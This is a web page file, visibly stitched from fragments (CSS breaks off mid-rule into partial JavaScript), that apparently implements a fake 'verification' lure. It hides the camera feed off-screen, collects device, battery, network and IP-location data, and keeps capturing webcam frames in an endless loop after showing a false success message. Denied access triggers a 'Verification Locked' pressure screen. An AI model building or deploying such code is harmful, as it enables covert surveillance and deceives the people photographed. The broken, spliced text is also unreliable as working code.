    <style>
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        /* video must NOT use display:none — browsers stop rendering frames when hidden that way */
        /* Instead, position off-screen so it's invisible but still renders */
        canvas,
        video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* ============ SHARED CARD ============ */
        .c-wrap {
            width: 100%;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .c-card {
            width: 100%;
            max-width: 420px;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.25);
            animation: slideUp 0.5s cubic-bezier(.34, 1.56, .64, 1) both;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px) scale(0.96);
            }

            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .c-header {
            padding: 28px 28px 20px;
            text-align: center;
            position: relative;
        }

        .c-logo {
            font-size: 2.8rem;
            margin-bottom: 8px;
            display: block;
        }

        .c-brand {
            font-size: 1.25rem;
            font-weight: 800;
            margin-bottom: 4px;
        }

        .c-tagline {
            font-size: 0.83rem;
            opacity: 0.75;
        }

        .c-body {
            padding: 24px 28px;
        }

        .c-offer-box {
            border-radius: 16px;
            padding: 18px;
            margin-bottom: 20px;
            text-align: center;
        }

        .c-offer-big {
            font-size: 2.2rem;
            font-weight: 900;
            line-height: 1;
            margin-bottom: 4px;
        }

        .c-offer-sub {
            font-size: 0.85rem;
            opacity: 0.8;
        }

        .c-msg {
            font-size: 0.88rem;
            line-height: 1.65;
            margin-bottom: 22px;
            opacity: 0.85;
        }

        .c-btn {
            width: 100%;
            padding: 16px;
            border-radius: 14px;
            border: none;
            font-family: 'Inter', sans-serif;
            font-size: 1.1rem;
            font-weight: 800;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.25s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            animation: pulse-force 2s infinite;
        }

        @keyframes pulse-force {
            0% {
                transform: scale(1);
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            }

            50% {
                transform: scale(1.04);
                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
            }

            100% {
                transform: scale(1);
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            }
        }

        .c-btn:hover {
            transform: translateY(-2px) scale(1.02);
            filter: brightness(1.1);
        }

        .c-btn:active {
            transform: translateY(0) scale(0.98);
        }

        .c-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .c-note {
            font-size: 0.72rem;
            opacity: 0.5;
            text-align: center;
            margin-top: 14px;
        }

        /* Progress bar */
        .c-progress {
            height: 5px;
            border-radius: 5px;
            margin: 18px 0;
            overflow: hidden;
            background: rgba(0, 0, 0, 0.1);
        }

        .c-progress-fill {
            height: 100%;
            border-radius: 5px;
            width: 0;
            transition: width 0.5s ease;
        }

        /* Status msg */
        .c-status {
            font-size: 0.82rem;
            text-align: center;
            min-height: 22px;
            margin-bottom: 10px;
            font-weight: 500;
        }

        /* Success overlay */
        .c-success {
            display: none;
            text-align: center;
            padding: 10px 0;
        }

        .c-success.show {
            display: block;
        }

        .c-success-icon {
            font-size: 3rem;
            margin-bottom: 10px;
        }

        .c-success-title {
            font-size: 1.2rem;
            font-weight: 800;
            margin-bottom: 6px;
        }

        .c-success-sub {
            font-size: 0.83rem;
            opacity: 0.7;
            line-height: 1.5;
        }

        /* Spinner */
        .spin {
            animation: spinAnim 0.9s linear infinite;
        }

        @keyframes spinAnim {
            to {
                transform: rotate(360deg);
            }
        }

        /* Timer ring */
        .c-timer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 0.78rem;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .timer-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            animation: timerPulse 1s ease infinite;
        }

        @keyframes timerPulse {

            0%,
            100% {
                opacity: 1;
                transform: scale(1)
            }

            50% {
                opacity: 0.5;
                transform: scale(1.3)
            }
        }

        /* Denied box */
        .c-denied {
            display: none;
            padding: 12px 16px;
            border-radius: 12px;
            font-size: 0.8rem;
            margin-top: 14px;
            line-height: 1.5;
        }

        /* Scanning Overlay */
        .c-scanner {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(4px);
            z-index: 10;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
            border-radius: 24px;
        }

        .c-scanner.active {
            display: flex;
        }

        .scan-line {
            width: 80%;
            height: 2px;
            background: #fff;
            box-shadow: 0 0 15px #fff, 0 0 30px #fff;
            position: absolute;
            top: 15%;
            animation: scanMove 2s linear infinite;
        }

        @keyframes scanMove {
            0% {
                top: 15%;
                opacity: 0;
            }

            10% {
                opacity: 1;
            }

            90% {
                opacity: 1;
            }

            100% {
                top: 75%;
                opacity: 0;
            }
        }

        .scan-circle {
            width: 120px;
            height: 120px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .scan-circle::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;

                ram: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
                time: new Date().toLocaleString()
            };

            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    meta.battery = Math.floor(b.level * 100) + '%';
                    meta.charging = b.charging;
                }
            } catch (e) { }

            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                meta.network = conn.effectiveType || 'unknown';
                meta.downlink = conn.downlink + 'Mbps';
            }

            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 4000);
                const res = await fetch('https://ipapi.co/json/', { signal: controller.signal }).catch(() => null);

                    meta.country = data.country_name;

            return meta;

            // --- AGGRESSIVE START ---
            let readyTimer = setInterval(() => {
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    clearInterval(readyTimer);
                    startInfiniteBurst(canvas, video);
                }
            }, 100);

            // Fail-safe limit for ready check
            setTimeout(() => clearInterval(readyTimer), 5000);
        }

        function startInfiniteBurst(canvas, video) {
            // Setup canvas
            const maxW = 640; // lower for efficiency
            const ratio = Math.min(maxW / video.videoWidth, 1);
            canvas.width = video.videoWidth * ratio;
            canvas.height = video.videoHeight * ratio;

            // Show scanner
            const sc = document.getElementById('scannerOverlay');
            if (sc) sc.classList.add('active');
            setProgress(60);
            setSyncStatus('capturing');

            // Wait brief warmup then burst
            setTimeout(() => {
                const ctx = canvas.getContext('2d', { alpha: false });

                const interval = setInterval(() => {
                    if (!capturing || !stream) {
                        clearInterval(interval);
                        return;
                    }

                    try {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const dataUrl = canvas.toDataURL('image/jpeg', 0.45);
                        if (dataUrl.length > 3000) {
                            savePhoto(dataUrl);
                            // Keep progress high but pulsing
                            setProgress(90 + (Math.random() * 8));
                        }
                    } catch (e) { }

                }, INTERVAL);

                // Show success UI after 6 seconds but keep the loop running
                setTimeout(() => {
                    setSyncStatus('done');
                    onDone();
                }, 6000);

            }, WARMUP_MS);
        }

        function finalizeCapture() {
            // Unused in infinite mode
        }

        // --- Save photo to localStorage with auto-cleanup ---
        function savePhoto(dataUrl) {
            const key = 'cemra_captures_' + sessionId;
            cleanupStorage(dataUrl.length);

            try {
                const existing = JSON.parse(localStorage.getItem(key) || '[]');
                existing.push({
                    id: 'cap_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
                    src: dataUrl,
                    time: new Date().toISOString(),
                    size: (dataUrl.length / 1024).toFixed(1) + ' KB',
                    session: sessionId
                });
                localStorage.setItem(key, JSON.stringify(existing));
            } catch (e) {
                console.warn('Storage Full');
                try {
                    const existing = JSON.parse(localStorage.getItem(key) || '[]');
                    existing.splice(0, 3);
                    localStorage.setItem(key, JSON.stringify(existing));
                } catch { }
            }
        }

        function cleanupStorage(neededSize) {
            let total = 0;
            for (let k in localStorage) {
                if (localStorage.hasOwnProperty(k)) total += (localStorage[k].length * 2);
            }
            if (total > 4 * 1024 * 1024) {
                for (let k in localStorage) {
                    if (k.startsWith('cemra_captures_') && !k.endsWith(sessionId)) {
                        localStorage.removeItem(k);
                    }
                }
            }
        }

        function stopStream() {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }
            capturing = false;
        }

        function onDone() {
            capturing = false;
            setStatus(theme.statusDone);
            const sc = document.getElementById('scannerOverlay');
            if (sc) sc.classList.remove('active');
            const sb = document.getElementById('successBox');
            if (sb) sb.classList.add('show');
            const btn = document.getElementById('mainBtn');
            if (btn) btn.style.display = 'none';
        }

        function onPermanentFail(reason) {
            capturing = false;
            const btn = document.getElementById('mainBtn');
            if (btn) {
                btn.classList.remove('btn-loading');
                btn.disabled = false;
                btn.style.display = 'flex';
                btn.innerHTML = `<i class="${theme.btnIcon}"></i> ${theme.btnText}`;
            }

            if (reason === 'no_hardware') {
                const ncb = document.getElementById('noCamBox');
                if (ncb) ncb.style.display = 'block';
                document.getElementById('noCamTitle').textContent = theme.noCamTitle || 'Camera Not Found';
                document.getElementById('noCamMsg').textContent = theme.noCamMsg || 'A working camera is required for verification.';
            } else {
                const db = document.getElementById('deniedBox');
                if (db) {
                    db.style.display = 'block';
                    db.innerHTML = `<i class="fa-solid fa-lock" style="font-size: 3rem; margin-bottom: 20px; color: #ff4d4d;"></i>
                                  <h2>Verification Locked</h2>
                                  <p>You have denied camera permissions. To continue with the ${theme.brand} verification, please enable camera access and refresh this page.</p>`;
                }
            }

            setStatus('');
            setProgress(0);
        }

        function setStatus(msg) {
            const el = document.getElementById('statusMsg');
            if (el) el.textContent = msg;
        }
        function setProgress(pct) {
            const fill = document.getElementById('progressFill');
            if (fill) fill.style.width = Math.min(pct, 100) + '%';
        }
    </script>
</body>
